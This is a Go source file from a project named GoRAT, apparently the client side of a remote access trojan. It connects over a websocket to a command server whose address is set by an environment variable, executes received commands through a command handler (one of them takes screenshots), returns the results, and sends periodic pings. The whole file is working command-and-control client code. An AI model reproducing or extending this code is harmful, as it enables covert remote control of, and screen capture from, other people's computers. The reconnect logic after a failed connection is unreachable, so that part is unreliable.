// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package client

import (
	"log"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/fjah/GoRAT/commands"
	"github.com/gorilla/websocket"
)

// Init initialises the client
func Init() {
	serverAddr := os.Getenv("SERVER_ADDRESS")

	// Wait for interrupt
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	// Create the url
	u := url.URL{Scheme: "ws", Host: serverAddr, Path: "/ws"}
	log.Println("DIAL:", u.String())

	// Connect
	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		chksoft(err)

		for {
			select {
			case <-interrupt:
				os.Exit(0)
			}
		}

		time.Sleep(10 * time.Second)
		Init()
		return
	}
	defer c.Close()

	done := make(chan struct{})

	go func() {
		defer close(done)
		for {
			// Read messages
			_, message, err := c.ReadMessage()
			chk(err)

			// Send the result
			if !strings.HasPrefix(string(message), "ACK") {
				res, cmdName := commands.HandleCommand(message)
				if cmdName == "SCREENSHOT" {
					log.Println("SCREENSHOT <image data>")
				} else {
					log.Println(cmdName + " " + strings.TrimSpace(res))
				}
				chk(c.WriteMessage(websocket.TextMessage, []byte(cmdName+" "+res)))
			} else {
				if strings.Split(string(message), " ")[1] == "SCREENSHOT" {
					log.Println("SCREENSHOT <image data>")
				} else {
					log.Println(string(message))
				}
			}
		}
	}()

	// Create a 5 sec ticker
	ticker := time.NewTicker(time.Second * 5)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case t := <-ticker.C:
			tString := "PING " + t.String()

			// Send a ping message
			chk(c.WriteMessage(websocket.TextMessage, []byte(tString)))
		case <-interrupt:
			// Cleanly close the connection
			chk(c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "")))
			select {
			case <-done:
			case <-time.After(time.Second):
			}
			return
		}
	}
}
